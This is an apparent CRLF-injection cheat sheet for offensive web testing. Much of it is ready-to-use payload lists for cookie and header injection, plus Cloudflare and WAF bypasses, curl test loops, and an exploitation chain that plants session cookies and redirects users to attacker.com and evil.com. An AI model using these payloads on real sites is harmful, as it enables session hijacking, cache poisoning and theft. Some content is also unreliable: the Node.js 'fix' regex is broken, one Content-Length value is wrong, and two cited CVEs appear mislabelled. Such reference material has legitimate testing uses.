# CRLF Injection

## Overview

CRLF injection occurs when an attacker is able to inject carriage return (%0d) and line feed (%0a) characters into an application's input. This can lead to HTTP response splitting, HTTP header injection, and other attack vectors.

## Real-World Examples

### Example 1: LinkedIn (2014)
A CRLF injection vulnerability was discovered in LinkedIn's redirection functionality, allowing attackers to set arbitrary cookies and potentially hijack sessions.

### Example 2: Twitter (2013)
Twitter suffered from a CRLF injection vulnerability in the `?lang=` parameter that allowed response splitting and XSS attacks.

### Example 3: Uber (2016)
Security researchers found CRLF injection in Uber's subdomain handling, enabling cache poisoning attacks.

### Example 4: PayPal (2020)
A CRLF injection was discovered in PayPal's billing agreement endpoint, allowing attackers to manipulate HTTP responses and potentially steal user data.

## How CRLF Injection Works

HTTP uses carriage return (CR, `%0d`) and line feed (LF, `%0a`) characters to separate headers and denote the end of a header section. When an application echoes user input into HTTP headers without proper sanitization, an attacker can inject these characters to:

1. Terminate the current HTTP header
2. Inject new HTTP headers
3. Split the HTTP response into multiple responses
4. Control the content that the browser parses

## The Attack Pattern Explained

The following simplified example uses CRLF to:

1. Add a fake HTTP response header: `Content-Length: 0`. This causes the web browser to treat this as a terminated response and begin parsing a new response.
2. Add a fake HTTP response: `HTTP/1.1 200 OK`. This begins the new response.
3. Add another fake HTTP response header: `Content-Type: text/html`. This is needed for the web browser to properly parse the content.
4. Add yet another fake HTTP response header: `Content-Length: 25`. This causes the web browser to only parse the next 25 bytes.
5. Add page content with an XSS: `<script>alert(1)</script>`. This content has exactly 25 bytes.
6. Because of the Content-Length header, the web browser ignores the original content that comes from the web server.

```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```

## Tools for CRLF Injection Testing

### CRLF Injection Scanner
```bash
# https://github.com/MichaelStott/CRLF-Injection-Scanner
crlf_scan.py -i <inputfile> -o <outputfile>
```

### CRLFuzz
```bash
# https://github.com/dwisiswant0/crlfuzz
crlfuzz -u "http://target"
```

### CRLFMap
```bash
# https://github.com/ryandamour/crlfmap
crlfmap scan --domains domains.txt --output results.txt
```

## CRLF Injection Payload List

### Cloudflare CRLF Bypass
```
<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
```

### Set-Cookie Injection Payloads
```
/%%0a0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0d%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%23%0dSet-Cookie:crlf=injection
/%25%30%61Set-Cookie:crlf=injection
/%25%30aSet-Cookie:crlf=injection
/%250aSet-Cookie:crlf=injection
/%25250aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection
/%u000aSet-Cookie:crlf=injection
/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

### Header Injection Payloads
```
/%0d%0aheader:header
/%0aheader:header
/%0dheader:header
/%23%0dheader:header
/%3f%0dheader:header
/%250aheader:header
/%25250aheader:header
/%%0a0aheader:header
/%3f%0dheader:header
/%23%0dheader:header
/%25%30aheader:header
/%25%30%61header:header
/%u000aheader:header
```

## Advanced Attack Scenarios

### HTTP Response Splitting for Cache Poisoning

When an attacker injects CRLF sequences, they can create a second HTTP response that gets cached by intermediate proxies. Example:

```
GET /page?param=foo%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2043%0d%0a%0d%0a<html>Hacked%20by%20Attacker</html> HTTP/1.1
Host: vulnerable.com
```

### Session Fixation via CRLF

```
https://vulnerable.com/login?redirect=%0d%0aSet-Cookie:%20SESSIONID=ATTACKER_CONTROLLED%0d%0a
```

### Cross-Site Scripting (XSS) via CRLF

```
https://vulnerable.com/search?q=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>
```

### Log Injection / Log Forgery

Attackers can inject fake log entries to evade detection or confuse incident response:

```
https://vulnerable.com/login?user=admin%0d%0a[INFO]%20Login%20successful%20from%20127.0.0.1%0d%0a
```

## Detection Methodology

### Manual Testing Steps

1. Identify all input vectors (parameters, headers, cookies, URL paths)
2. Inject `%0d%0a` followed by a unique string
3. Monitor HTTP responses for the injected string appearing in headers
4. Check for response splitting by observing multiple HTTP responses

### Automated Detection Commands

```bash
# Using curl for manual testing
curl -I "https://target.com/page?param=test%0d%0aX-Injected:true"

# Using Burp Suite Intruder with payload list
# Payload positions: %0d%0aInjected: value

# Using custom scanner
for payload in "%0d%0a" "%0a" "%0d" "%23%0a" "%23%0d%0a"; do
    curl -s -I "https://target.com/page?q=${payload}Set-Cookie:test=injected" | grep -i "Set-Cookie"
done
```

## Exploitation Techniques

### Bypassing Common Filters

| Filter Type | Bypass Technique |
|-------------|------------------|
| Blacklisting `%0d%0a` | Use double encoding: `%250d%250a` |
| Case-sensitive filters | Use uppercase/lowercase variations: `%0D%0A` |
| Partial encoding | Use `%00%0d%0a` or `%20%0d%0a` |
| WAF bypass | Use Unicode variations: `%u000d%u000a` |

### Real-World Exploitation Steps

1. **Reconnaissance**: Identify parameters reflected in HTTP headers
2. **Validation**: Test with `%0d%0aX-Test: injected` and verify in response
3. **Exploitation**: Craft payload to achieve desired impact
4. **Chaining**: Combine with XSS, CSRF, or session attacks

### Example: Complete Exploitation Chain

```
Step 1: Inject CRLF to set malicious cookie
https://vulnerable.com/settings?lang=%0d%0aSet-Cookie:%20session=attacker_session%3b%20Domain=.vulnerable.com%0d%0a

Step 2: Redirect to attacker-controlled page
https://vulnerable.com/settings?lang=%0d%0aLocation:%20https://attacker.com/steal.php%0d%0a

Step 3: Cache poisoning for widespread impact
https://vulnerable.com/page?param=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20302%20Found%0d%0aLocation:%20https://evil.com%0d%0a
```

## Remediation

### Prevention Techniques

1. **Input validation**: Reject any input containing CR (`%0d`, `\r`, `%0D`) or LF (`%0a`, `\n`, `%0A`) characters
2. **Output encoding**: Encode CRLF characters to their HTML entities
3. **Use safe APIs**: Avoid constructing HTTP headers from user input
4. **Whitelist approach**: Only allow known-good characters in parameters

### Code Examples

**Vulnerable PHP code:**
```php
header("Location: /redirect?page=" . $_GET['page']);
```

**Fixed PHP code:**
```php
$page = str_replace(array("\r", "\n", "%0d", "%0a"), '', $_GET['page']);
header("Location: /redirect?page=" . $page);
```

**Vulnerable Node.js code:**
```javascript
res.setHeader('X-Param', req.query.param);
```

**Fixed Node.js code:**
```javascript
const sanitized = req.query.param.replace(/[\r\n%0d%0a]/gi, '');
res.setHeader('X-Param', sanitized);
```

## Impact Assessment

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| HTTP Response Splitting | Critical | Attacker controls entire HTTP response |
| Cache Poisoning | High | Malicious responses cached for all users |
| Session Fixation | High | Attacker sets arbitrary session cookies |
| XSS via Header Injection | Medium-High | Execute JavaScript in victim's browser |
| Log Injection | Medium | Fake log entries to hide malicious activity |
| Browser Cache Poisoning | Medium | Malicious content stored in browser cache |

## References

- CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
- CVE-2019-7644: Auth0 CRLF Injection
- CVE-2020-11022: jQuery CRLF Injection
- OWASP: CRLF Injection
